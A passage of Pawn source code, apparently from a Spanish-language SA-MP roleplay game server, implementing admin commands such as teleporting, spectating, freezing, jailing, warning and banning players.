    if(AdminDuty[playerid] != 1) { SendClientMessage(playerid, Rojo ,"* Ponte duty primero."); return 1; }
	tmp = strtok(cmdtext,idx);
	if(!strlen(tmp))
	{
	    SendClientMessage(playerid, Naranja, "* /Gotopos [Coor:x] [Coor:y] [Coor:z]");
	    return 1;
	}
	new Float:int_x;
	int_x = floatstr(tmp);
	tmp = strtok(cmdtext,idx);
	if(!strlen(tmp))
    {
	    SendClientMessage(playerid, Naranja, "* /Gotopos [Coor:x] [Coor:y] [Coor:z]");
	    return 1;
    }
	new Float:int_y;
	int_y = floatstr(tmp);
	tmp = strtok(cmdtext,idx);
	if(!strlen(tmp))
    {
	    SendClientMessage(playerid, Naranja, "* /Gotopos [Coor:x] [Coor:y] [Coor:z]");
	    return 1;
    }
	new Float:int_z;
	int_z = floatstr(tmp);
	format(string, sizeof(string), "Teleportado a las coordenadas X: %1.5f, Y: %1.5f, Z: %1.5f",int_x, int_y, int_z);
	SendClientMessage(playerid, AzulClaro, string);
	SetPlayerPos(playerid, int_x, int_y, int_z);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------
if(strcmp(cmd, "/go", true) == 0) //Ir a un sitio concreto
{
	if(IsPlayerConnected(playerid))
	{
		if(PlayerInfo[playerid][pAdmin] >= 1)
		{
			new opcion[128];
			if(AdminDuty[playerid] != 1) { SendClientMessage(playerid, Rojo ,"* Ponte duty primero."); return 1; }
			opcion = strtok(cmdtext, idx);
			if(!strlen(opcion))
			{
				SendClientMessage(playerid, Naranja, "* /Go [Opción] ");
				SendClientMessage(playerid, Naranja, "Ayunta, Unity, Aeropuerto, Parque, Estadio, Centro");
				SendClientMessage(playerid, Naranja, "Vinewood, Autoescuela, Noria, Dillimore");
				SendClientMessage(playerid, Naranja, "PalominoCreek, Montgomery, Blueberry");
				return 1;
			}
			if(strcmp(opcion,"Ayunta",true) == 0)
			{
				if(GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, 1479.8407,-1732.0394,13.3828);
				}
				else
				{
					SetPlayerPos(playerid, 1479.8407,-1732.0394,13.3828);
				}
			}
			if(strcmp(opcion,"Unity",true) == 0)
			{
				if(GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, 1814.1198,-1876.0316,13.5781);
				}
				else
				{
					SetPlayerPos(playerid, 1814.1198,-1876.0316,13.5781);
				}
			}
			if(strcmp(opcion,"Aeropuerto",true) == 0)
			{
				if(GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, 1957.5502,-2336.6917,13.5469);
				}
				else
				{
				SetPlayerPos(playerid, 1957.5502,-2336.6917,13.5469);
				}
			}
			if(strcmp(opcion,"Parque",true) == 0)
			{
				if(GetPlayerState(playerid) == 2)
				{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 1967.7217,-1178.1401,20.0307);
				}
				else
				{
				SetPlayerPos(playerid, 1967.7217,-1178.1401,20.0307);
				}
			}
			if(strcmp(opcion,"Estadio",true) == 0)
			{
				if(GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, 2817.1675,-1853.7288,11.1749);
				}
				else
				{
					SetPlayerPos(playerid, 2817.1675,-1853.7288,11.1749);
				}
			}
			if(strcmp(opcion,"Centro",true) == 0)
			{
				if(GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, 1537.3672,-1292.1428,15.9839);
				}
				else
				{
					SetPlayerPos(playerid, 1537.3672,-1292.1428,15.9839);
				}
			}
			if(strcmp(opcion,"Noria",true) == 0)
			{
				if(GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, 376.0127,-2028.3690,7.8301);
				}
				else
				{
					SetPlayerPos(playerid, 376.0127,-2028.3690,7.8301);
				}
			}
			if(strcmp(opcion,"Vinewood",true) == 0)
			{
				if(GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, 1167.1160,-934.8107,43.2174);
				}
				else
				{
					SetPlayerPos(playerid, 1167.1160,-934.8107,43.2174);
				}
			}
			if(strcmp(opcion,"Autoescuela",true) == 0)
			{
				if(GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, 2074.2122,-1899.7969,13.5469);
				}
				else
				{
					SetPlayerPos(playerid, 2074.2122,-1899.7969,13.5469);
				}
			}
			if(strcmp(opcion,"Dillimore",true) == 0)
			{
				if(GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, 674.0398,-606.6791,16.3359);
				}
				else
				{
					SetPlayerPos(playerid, 674.0398,-606.6791,16.3359);
				}
			}
			if(strcmp(opcion,"Montgomery",true) == 0)
			{
				if(GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, 1286.0684,260.0658,19.5469);
				}
				else
				{
					SetPlayerPos(playerid, 1286.0684,260.0658,19.5469);
				}
			}
			if(strcmp(opcion,"PalominoCreek",true) == 0)
			{
				if(GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, 2300.8948,41.3189,26.4844);
				}
				else
				{
					SetPlayerPos(playerid, 2300.8948,41.3189,26.4844);
				}
			}
			if(strcmp(opcion,"Blueberry",true) == 0)
			{
				if(GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, 189.5701,-204.1178,1.5781);
				}
				else
				{
					SetPlayerPos(playerid, 189.5701,-204.1178,1.5781);
				}
			}
		}
		else  {  SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente.");  }
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/goto", true) == 0) //Teleportarse a la posición de un jugador
{
    tmp = strtok(cmdtext, idx);
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    if(AdminDuty[playerid] != 1) { SendClientMessage(playerid, Rojo ,"* Ponte duty primero."); return 1; }
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Goto [ID]");
        return 1;
    }
    new Float:x, Float:y, Float:z;
    playerid2 = ReturnUser(tmp);
    format(Nombre2, sizeof(Nombre2),"%s", GetPlayerNameRP(playerid2));
    if(IsPlayerConnected(playerid2))
    {
        if(playerid2 != INVALID_PLAYER_ID)
        {
            GetPlayerPos(playerid2, x, y, z);
            SetPlayerInterior(playerid,GetPlayerInterior(playerid2));
            SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(playerid2));
            if(GetPlayerState(playerid) == 2)
            {
                new tmpcar = GetPlayerVehicleID(playerid);
                SetVehiclePos(tmpcar, x, y+2, z);
            }
            else
            {
                SetPlayerPos(playerid, x, y+0.5, z+2);
            }
            format(string, sizeof(string), "Teleportado a la posición de '%s'.", Nombre2);
            SendClientMessage(playerid, AzulClaro, string);
        }
    }
    else  {  SendClientMessage(playerid, Rojo, "* ID inválida.");  }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/get", true) == 0) //Traer un jugador a tu posición
{
    tmp = strtok(cmdtext, idx);
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    if(AdminDuty[playerid] != 1) { SendClientMessage(playerid, Rojo ,"* Ponte duty primero."); return 1; }
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Get [ID]");
        return 1;
    }
    new Float:x, Float:y, Float:z;
    playerid2 = ReturnUser(tmp);
    format(Nombre2, sizeof(Nombre2),"%s", GetPlayerNameRP(playerid2));
    format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
    if(IsPlayerConnected(playerid2))
    {
        if(playerid2 != INVALID_PLAYER_ID)
        {
            GetPlayerPos(playerid, x, y, z);
            SetPlayerInterior(playerid2,GetPlayerInterior(playerid));
            SetPlayerVirtualWorld(playerid2,GetPlayerVirtualWorld(playerid));
            if(GetPlayerState(playerid2) == 2)
            {
                new tmpcar = GetPlayerVehicleID(playerid2);
                SetVehiclePos(tmpcar, x, y+2, z);
            }
            else
            {
                SetPlayerPos(playerid2, x, y+0.5, z+1);
            }
            format(string, sizeof(string), "Has traido a '%s' a tu posición.", Nombre2);
            SendClientMessage(playerid, AzulClaro, string);
            format(string, sizeof(string), "'%s' te ha llevado a su posición.", Nombre);
            SendClientMessage(playerid2, AzulClaro, string);
        }
    }
    else  {  SendClientMessage(playerid, Rojo, "* ID inválida.");  }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/gotocar", true) == 0) //Teleportarse a la posición de un vehículo
{
    tmp = strtok(cmdtext, idx);
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    if(AdminDuty[playerid] != 1) { SendClientMessage(playerid, Rojo ,"* Ponte duty primero."); return 1; }
	if(!strlen(tmp) || !IsNumeric(tmp))
	{
        SendClientMessage(playerid, Naranja, "* /Gotocar [ID]");
        return 1;
	}
	new carid = strval(tmp);
	if(!IsValidVehicle(carid))
	{
    	SendClientMessage(playerid, Rojo, "* ID inválida, vehículo no encontrado.");
    	return 1;
	}
    new Float:cx,Float:cy,Float:cz;
    GetVehiclePos(carid, cx, cy, cz);
	if(GetPlayerState(playerid) == 2)
	{
        SetVehiclePos(GetPlayerVehicleID(playerid), cx, cy, cz);
	}
	else
	{
        SetPlayerPos(playerid, cx, cy, (cz + 4.0));
	}
	SetPlayerVirtualWorld(playerid, CarInfo[carid][cVirtualWorld]);
	SetPlayerInterior(playerid, CarInfo[carid][cInterior]);
	format(string, sizeof(string), "Teleportado a la posición del vehículo %d.", carid);
    SendClientMessage(playerid, AzulClaro, string);
    return 1;
}
	
//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/getcar", true) == 0) //Traer un vehículo
{
    tmp = strtok(cmdtext, idx);
    if(PlayerInfo[playerid][pAdmin] < 2){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    if(AdminDuty[playerid] != 1) { SendClientMessage(playerid, Rojo ,"* Ponte duty primero."); return 1; }
	if(!strlen(tmp) || !IsNumeric(tmp))
	{
        SendClientMessage(playerid, Naranja, "* /Getcar [ID]");
        return 1;
	}
	new carid = strval(tmp);
	if(!IsValidVehicle(carid))
	{
    	SendClientMessage(playerid, Rojo, "* ID inválida, vehículo no encontrado.");
    	return 1;
	}
    new Float:cx,Float:cy,Float:cz;
    GetPlayerPos(playerid, cx, cy, cz);
    SetVehiclePos(carid, cx, cy, cz);
    SetVehicleVirtualWorld(carid, GetPlayerVirtualWorld(playerid));
    LinkVehicleToInteriorEx(carid, GetPlayerInterior(playerid));
    SetPlayerPos(playerid, cx, cy, (cz + 4.0));
	format(string, sizeof(string), "Has traido a tu posición el vehículo %d.", carid);
    SendClientMessage(playerid, AzulClaro, string);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/gotocarllave", true) == 0) //Teleportarse a la posición de un vehículo mediante su llave
{
    tmp = strtok(cmdtext, idx);
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    if(AdminDuty[playerid] != 1) { SendClientMessage(playerid, Rojo ,"* Ponte duty primero."); return 1; }
	if(!strlen(tmp) || !IsNumeric(tmp))
	{
        SendClientMessage(playerid, Naranja, "* /Gotocarllave [Llave]");
        return 1;
	}
	new llave = strval(tmp);
	new VehEncontrado;
	for(new x=0; x<=TotalVeh; x++)
	{
    	if(CarInfo[x][cLlave] == llave){VehEncontrado = x; break;}
	}
	if(VehEncontrado == 0){SendClientMessage(playerid, Rojo, "* Llave inválida, vehículo no encontrado."); return 1;}
    new Float:cx,Float:cy,Float:cz;
    GetVehiclePos(VehEncontrado, cx, cy, cz);
	if(GetPlayerState(playerid) == 2)
	{
        SetVehiclePos(GetPlayerVehicleID(playerid), cx, cy, cz);
	}
	else
	{
        SetPlayerPos(playerid, cx, cy, (cz + 2.0));
	}
	SetPlayerVirtualWorld(playerid, CarInfo[VehEncontrado][cVirtualWorld]);
	SetPlayerInterior(playerid, CarInfo[VehEncontrado][cInterior]);
	format(string, sizeof(string), "Teleportado a la posición del vehículo con llave %d.", llave);
    SendClientMessage(playerid, AzulClaro, string);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/getcarllave", true) == 0) //Traer un vehículo mediante su llave
{
    tmp = strtok(cmdtext, idx);
    if(PlayerInfo[playerid][pAdmin] < 2){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    if(AdminDuty[playerid] != 1) { SendClientMessage(playerid, Rojo ,"* Ponte duty primero."); return 1; }
	if(!strlen(tmp) || !IsNumeric(tmp))
	{
        SendClientMessage(playerid, Naranja, "* /Getcarllave [Llave]");
        return 1;
	}
	new llave = strval(tmp);
	new VehEncontrado;
	for(new x=0; x<=TotalVeh; x++)
	{
    	if(CarInfo[x][cLlave] == llave){VehEncontrado = x; break;}
	}
	if(VehEncontrado == 0){SendClientMessage(playerid, Rojo, "* Llave inválida, vehículo no encontrado."); return 1;}
    new Float:px,Float:py,Float:pz;
    GetPlayerPos(playerid, px, py, pz);
    SetVehiclePos(VehEncontrado, px, py, pz);
    SetVehicleVirtualWorld(VehEncontrado, GetPlayerVirtualWorld(playerid));
    LinkVehicleToInteriorEx(VehEncontrado, GetPlayerInterior(playerid));
    SetPlayerPos(playerid, px, py, (pz + 2.0));
	format(string, sizeof(string), "Has traido a tu posición el vehículo con llave %d.", llave);
    SendClientMessage(playerid, AzulClaro, string);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/congelar", true) == 0 || strcmp(cmd, "/con", true) == 0) //Congelar a un jugador
{
    tmp = strtok(cmdtext, idx);
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /(Con)gelar [ID]");
        return 1;
    }
    playerid2 = ReturnUser(tmp);
    format(Nombre2, sizeof(Nombre2),"%s", GetPlayerNameRP(playerid2));
    format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
    if(IsPlayerConnected(playerid2))
    {
        if(playerid2 != INVALID_PLAYER_ID)
        {
			TogglePlayerControllable(playerid2, 0);
            format(string, sizeof(string), "Has congelado a '%s'.", Nombre2);
            SendClientMessage(playerid, AzulClaro, string);
            format(string, sizeof(string), "Has sido congelado por '%s'.", Nombre);
            SendClientMessage(playerid2, AzulClaro, string);
        }
    }
    else  {  SendClientMessage(playerid, Rojo, "* ID inválida.");  }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/descongelar", true) == 0 || strcmp(cmd, "/descon", true) == 0) //Descongelar a un jugador
{
    tmp = strtok(cmdtext, idx);
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /(Descon)gelar [ID]");
        return 1;
    }
    playerid2 = ReturnUser(tmp);
    format(Nombre2, sizeof(Nombre2),"%s", GetPlayerNameRP(playerid2));
    format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
    if(IsPlayerConnected(playerid2))
    {
        if(playerid2 != INVALID_PLAYER_ID)
        {
			TogglePlayerControllable(playerid2, 1);
            format(string, sizeof(string), "Has descongelado a '%s'.", Nombre2);
            SendClientMessage(playerid, AzulClaro, string);
            format(string, sizeof(string), "Has sido descongelado por '%s'.", Nombre);
            SendClientMessage(playerid2, AzulClaro, string);
        }
    }
    else  {  SendClientMessage(playerid, Rojo, "* ID inválida.");  }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/recon", true) == 0) //Reconear a alguien
{
    if(PlayerInfo[playerid][pAdmin] <= 0 && !IsPlayerAdmin(playerid)){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    if(AdminDuty[playerid] == 0){SendClientMessage(playerid, Rojo, "* Ponte duty primero."); return 1;}
    {
        tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp)){SendClientMessage(playerid, Naranja, "* /Recon [ID]"); return 1;}
    	new specplayerid;
        specplayerid = ReturnUser(tmp);
        if(IsPlayerConnected(specplayerid) && specplayerid != INVALID_PLAYER_ID)
		{
		    if(specplayerid == playerid)
			{ SendClientMessage(playerid, Rojo, "* No te puedes reconear a tí mismo."); return 1; }
            if(GetPlayerState(specplayerid) == PLAYER_STATE_SPECTATING && PlayerInfo[playerid][pSpecID] != INVALID_PLAYER_ID)
			{ SendClientMessage(playerid, Rojo, "* Este jugador está reconeando."); return 1; }
			if(GetPlayerState(specplayerid) != 1 && GetPlayerState(specplayerid) != 2 && GetPlayerState(specplayerid) != 3)
			{ SendClientMessage(playerid, Rojo, "* ID inválida."); return 1; }
			if(GetPlayerState(playerid) != PLAYER_STATE_SPECTATING && PlayerInfo[playerid][pSpecID] == INVALID_PLAYER_ID)
			{
				GetPlayerPos(playerid,RecPos[playerid][0],RecPos[playerid][1],RecPos[playerid][2]);
				GetPlayerPos(playerid,PlayerInfo[playerid][pPosX],PlayerInfo[playerid][pPosY],PlayerInfo[playerid][pPosZ]);
				GetPlayerFacingAngle(playerid,RecPos[playerid][3]);
				IntRec[playerid] = (GetPlayerInterior(playerid));
				VwRec[playerid] = (GetPlayerVirtualWorld(playerid));
				PlayerInfo[playerid][pInterior] = IntRec[playerid];
	            PlayerInfo[playerid][pVirtualWorld] = VwRec[playerid];
			}
            StartSpectate(playerid, specplayerid);
			format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
			format(Nombre2, sizeof(Nombre2),"%s", GetPlayerNameRP(specplayerid));
			printf("%s esta reconeando a %s.", Nombre, Nombre2);
			format(string,sizeof(string),"Estás reconeando a '%s', para parar usa /reconoff.", Nombre2);
	 	    SendClientMessage(playerid,AzulClaro,string);
	 	    SendClientMessage(playerid,AzulClaro,"<< Shift | Espacio >>");
		}
		else { SendClientMessage(playerid,Rojo,"* ID inválida."); }
	}
	return 1;
}
	
//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/reconoff", true) == 0) //Dejar de reconear
{
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
	if(PlayerInfo[playerid][pSpecType] != ADMIN_SPEC_TYPE_NONE)
	{
		StopSpectate(playerid);
		TogglePlayerControllable(playerid, 0);
		SetTimerEx("ReturnPosition",500,0,"d",playerid);
		SendClientMessage(playerid,AzulClaro,"* Has dejado de reconear.");
		if(AdminDuty[playerid] == 1){SetPlayerSkin(playerid, 0);}
		else{SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]); PonerUniformeFaccion(playerid);}
	}
	else { SendClientMessage(playerid,Rojo,"* No estás reconeando a nadie."); }
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/gotomark", true) == 0) //Ir a una posición guardada
{
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    if(AdminDuty[playerid] != 1) { SendClientMessage(playerid, Rojo ,"* Ponte duty primero."); return 1; }
    if(MarkVW[playerid] == 0 && MarkI[playerid] == 0 && MarkX[playerid] == 0 && MarkY[playerid] == 0 && MarkZ[playerid] == 0 && MarkA[playerid] == 0){SendClientMessage(playerid, Rojo ,"* Utiliza antes el comando /mark para guardar una posición."); return 1;}
    SetPlayerVirtualWorld(playerid, MarkVW[playerid]);
    SetPlayerInterior(playerid, MarkI[playerid]);
    SetPlayerPos(playerid, MarkX[playerid], MarkY[playerid], MarkZ[playerid]);
    SetPlayerFacingAngle(playerid, MarkA[playerid]);
    SendClientMessage(playerid, AzulClaro, "* Teleportado a la posición guardada.");
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/mark", true) == 0) //Guardar una posición
{
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    GetPlayerPos(playerid, MarkX[playerid], MarkY[playerid], MarkZ[playerid]);
    GetPlayerFacingAngle(playerid, MarkA[playerid]);
    MarkI[playerid] = GetPlayerInterior(playerid);
    MarkVW[playerid] = GetPlayerVirtualWorld(playerid);
    SendClientMessage(playerid, AzulClaro, "* Posición guardada. /Gotomark para ir a ella.");
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/volar", true) == 0) //Modo vuelo
{
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    if(AdminDuty[playerid] != 1) { SendClientMessage(playerid, Rojo, "* Ponte duty primero."); return 1; }
    if(Volando[playerid] == 0) {StartFly(playerid); SendClientMessage(playerid, AzulClaro, "Modo vuelo activado."); SendClientMessage(playerid, AzulClaro, "(LMB) Subir | (RMB) Bajar | (Espacio) Rápido | (Alt) Lento");}
    else {StopFly(playerid); SendClientMessage(playerid, AzulClaro, "Modo vuelo desactivado.");}
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/ajail", true) == 0) //Jailear jugadores
{
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Ajail [ID] [Tiempo] [Razón]");
        return 1;
    }
    playerid2 = ReturnUser(tmp);
    tmp = strtok(cmdtext, idx);
    new time = strval(tmp);
    if(!IsNumeric(tmp) && !strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Ajail [ID] [Tiempo] [Razón]");
        return 1;
    }
    if(time < 0){SendClientMessage(playerid, Rojo, "* No puedes poner un tiempo negativo."); return 1;}
    if(IsPlayerConnected(playerid2) && playerid2 != INVALID_PLAYER_ID)
    {
        new length = strlen(cmdtext);
        while ((idx < length) && (cmdtext[idx] <= ' '))
        {
            idx++;
        }
        new offset = idx;
        new result[128];
        while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
        {
            result[idx - offset] = cmdtext[idx];
            idx++;
        }
        result[idx - offset] = EOS;
        if(!strlen(result))
        {
            SendClientMessage(playerid, Naranja, "* /Ajail [ID] [Tiempo] [Razón]");
            return 1;
        }
        format(Nombre2, sizeof(Nombre2),"%s", GetPlayerNameRP(playerid2));
        format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
        format(string, sizeof(string), "'%s' ha encarcelado a '%s' %d minutos. Motivo: %s.", Nombre, Nombre2, time, (result));
        SendClientMessageToAll(Rojo, string);
        format(string, sizeof(string), "Has encarcelado a '%s'.", Nombre2);
        SendClientMessage(playerid, AzulClaro, string);
        format(string, sizeof(string), "Has sido encarcelado por '%s'.", Nombre);
        SendClientMessage(playerid2, AzulClaro, string);
        printf("%s ha encarcelado a %s %d minutos por: %s", Nombre, Nombre2, time, (result));
        PlayerInfo[playerid2][pEncarcelado] = 3;
        PlayerInfo[playerid2][pTiempoCarcel] = time;
        if(time <= 0){UnJailPlayerOOC(playerid2); return 1;}
        SetTimerEx("JailPlayerOOC",100,0,"d",playerid2);
    }
    else
    {
        SendClientMessage(playerid,Rojo,"* ID inválida.");
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/advertir", true) == 0) //Advertir a jugadores
{
    if(PlayerInfo[playerid][pAdmin] < 2){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Advertir [ID] [Razón]");
        SendClientMessage(playerid, Naranja, "1: 30 mins jail, 2: 60 mins jail, 3: 120 mins jail, 4: ban.");
        return 1;
    }
    playerid2 = ReturnUser(tmp);
    if(IsPlayerConnected(playerid2) && playerid2 != INVALID_PLAYER_ID)
    {
        new length = strlen(cmdtext);
        while ((idx < length) && (cmdtext[idx] <= ' '))
        {
            idx++;
        }
        new offset = idx;
        new result[128];
        while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
        {
            result[idx - offset] = cmdtext[idx];
            idx++;
        }
        result[idx - offset] = EOS;
        if(!strlen(result))
        {
            SendClientMessage(playerid, Naranja, "* /Advertir [ID] [Razón]");
            SendClientMessage(playerid, Naranja, "1: 30 mins jail, 2: 60 mins jail, 3: 120 mins jail, 4: ban.");
            return 1;
        }
        PlayerInfo[playerid2][pAdvertencias] ++;
        format(Nombre2, sizeof(Nombre2),"%s", GetPlayerNameRP(playerid2));
        format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
        format(string, sizeof(string), "'%s' ha advertido a '%s'. Motivo: %s.", Nombre, Nombre2, (result));
        SendClientMessageToAll(Rojo, string);
        format(string, sizeof(string), "Has advertido a '%s' (%d/4).", Nombre2, PlayerInfo[playerid][pAdvertencias]);
        SendClientMessage(playerid, AzulClaro, string);
        format(string, sizeof(string), "Has sido advertido por '%s' (%d/4).", Nombre, PlayerInfo[playerid][pAdvertencias]);
        SendClientMessage(playerid2, AzulClaro, string);
        printf("%s ha advertido a %s (%d/4) por: %s", Nombre, Nombre2, PlayerInfo[playerid2][pAdvertencias], (result));
        PlayerPlaySound(playerid2,1137,0.0,0.0,0.0);
        switch(PlayerInfo[playerid2][pAdvertencias])
        {
            case 0:
            {
	            PlayerInfo[playerid2][pEncarcelado] = 3;
	            PlayerInfo[playerid2][pTiempoCarcel] = 30;
	            SendClientMessage(playerid2, AzulClaro, "Has sido jaileado 30 minutos por la advertencia.");
	            SetTimerEx("JailPlayerOOC",100,0,"d",playerid2);
            }
            case 1:
            {
	            PlayerInfo[playerid2][pEncarcelado] = 3;
	            PlayerInfo[playerid2][pTiempoCarcel] = 30;
	            SendClientMessage(playerid2, AzulClaro, "Has sido jaileado 30 minutos por la advertencia.");
	            SetTimerEx("JailPlayerOOC",100,0,"d",playerid2);
            }
            case 2:
            {
	            PlayerInfo[playerid2][pEncarcelado] = 3;
	            PlayerInfo[playerid2][pTiempoCarcel] = 60;
	            SendClientMessage(playerid2, AzulClaro, "Has sido jaileado 60 minutos por la advertencia.");
	            SetTimerEx("JailPlayerOOC",100,0,"d",playerid2);
            }
            case 3:
            {
	            PlayerInfo[playerid2][pEncarcelado] = 3;
	            PlayerInfo[playerid2][pTiempoCarcel] = 120;
	            SendClientMessage(playerid2, AzulClaro, "Has sido jaileado 120 minutos por la advertencia.");
	            SetTimerEx("JailPlayerOOC",100,0,"d",playerid2);
            }
            case 4:
            {
	            TogglePlayerControllable(playerid, 0);
	            format(string, sizeof(string), "'%s' ha sido baneado por acumulación de advertencias.",Nombre2);
	            SendClientMessageToAll(Rojo, string);
	            SendClientMessage(playerid2, Amarillo, "Has sido baneado por la advertencia.");
	            SendClientMessage(playerid2, Amarillo, "Si crees que ha sido un error, toma foto con F8 y pide tu desbán en el foro.");
	            BanL(playerid2);
            }
            default:
            {
	            TogglePlayerControllable(playerid, 0);
	            format(string, sizeof(string), "'%s' ha sido baneado por acumulación de advertencias.",Nombre2);
	            SendClientMessageToAll(Rojo, string);
	            SendClientMessage(playerid2, Amarillo, "Has sido baneado por la advertencia.");
	            SendClientMessage(playerid2, Amarillo, "Si crees que ha sido un error, toma foto con F8 y pide tu desbán en el foro.");
	            BanL(playerid2);
            }
        }
    }
    else
    {
        SendClientMessage(playerid,Rojo,"* ID inválida.");
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/desbug", true) == 0) //Desbuguear jugadores
{
    if(PlayerInfo[playerid][pAdmin] < 1){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Desbug [ID]");
        return 1;
    }
    playerid2 = ReturnUser(tmp);
    if(IsPlayerConnected(playerid2) && playerid2 != INVALID_PLAYER_ID)
    {
        format(Nombre2, sizeof(Nombre2),"%s", GetPlayerNameRP(playerid2));
        format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
        format(string, sizeof(string), "'%s' ha sido desbugueado por '%s'.", Nombre2, Nombre);
        SendClientMessageToAll(Rojo, string);
        format(string, sizeof(string), "Has desbugueado a '%s'.", Nombre2);
        SendClientMessage(playerid, AzulClaro, string);
        format(string, sizeof(string), "Has sido desbugueado por '%s'.", Nombre);
        SendClientMessage(playerid2, AzulClaro, string);
        printf("%s ha desbugueado a %s", Nombre, Nombre2);
		SetPlayerFacingAngle(playerid2, 0);
		SetPlayerVirtualWorld(playerid2, 0);
		SetPlayerInterior(playerid2, 0);
		SetPlayerPos(playerid2, 1479.1301,-1742.1343,13.5469);
		SetCameraBehindPlayer(playerid2);
		PlayerPlaySound(playerid2,1057,0.0,0.0,0.0);
	}
	else
    {
        SendClientMessage(playerid,Rojo,"* ID inválida.");
    }
    return 1;
}

